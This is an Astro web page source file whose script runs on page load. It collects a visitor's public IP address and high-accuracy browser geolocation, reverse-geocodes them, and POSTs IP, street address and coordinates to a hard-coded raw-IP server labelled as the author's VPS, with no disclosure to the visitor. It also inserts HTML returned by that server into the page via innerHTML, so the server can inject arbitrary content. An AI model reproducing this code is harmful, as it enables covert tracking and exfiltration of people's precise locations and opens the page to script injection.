import Layout from '../layouts/Layout.astro';
---

<Layout>
  <main>
    <h1>Welcome!</h1>
    <div id="visitor-info">Loading...</div>
    <div id="map-container" style="display:none; width: 100%; height: 400px; margin-top: 20px;"></div>
  </main>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
      async function getVisitorInfo() {
        try {
          const ipResponse = await fetch('https://api.ipify.org?format=json');
          if (!ipResponse.ok) throw new Error('Failed to fetch IP address');
          const ipData = await ipResponse.json();
          const ipAddress = ipData.ip;

          if (!navigator.geolocation) {
            throw new Error('Geolocation is not supported by this browser.');
          }

          navigator.geolocation.getCurrentPosition(
            async (position) => {
              try {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                const geoResponse = await fetch(`https://geocode.maps.co/reverse?lat=${latitude}&lon=${longitude}`);
                if (!geoResponse.ok) throw new Error('Failed to fetch location details');
                const locationData = await geoResponse.json();

                let locationString = locationData.display_name
                  ? `Location: ${locationData.display_name}`
                  : `Latitude: ${latitude}, Longitude: ${longitude}`;

                // --- Send data to your VPS ---
                const response = await fetch('https://95.111.255.206/send-location', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    ip: ipAddress,
                    location: locationString,
                    latitude,
                    longitude
                  }),
                });

                if (!response.ok) throw new Error(`Server error: ${response.status}`);
                const result = await response.json();

                console.log('Location data sent successfully:', result);

                document.getElementById('visitor-info').textContent = `IP: ${ipAddress}, ${locationString}`;

                // Display map
                if (result.map_embed_code) {
                  const mapContainer = document.getElementById('map-container');
                  mapContainer.innerHTML = result.map_embed_code;
                  mapContainer.style.display = 'block';
                }
              } catch (error) {
                console.error('Error processing location:', error);
              }
            },
            (error) => console.error('Geolocation error:', error),
            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
          );
        } catch (error) {
          console.error('Error fetching visitor info:', error);
        }
      }

      getVisitorInfo();
    });
  </script>
</Layout>
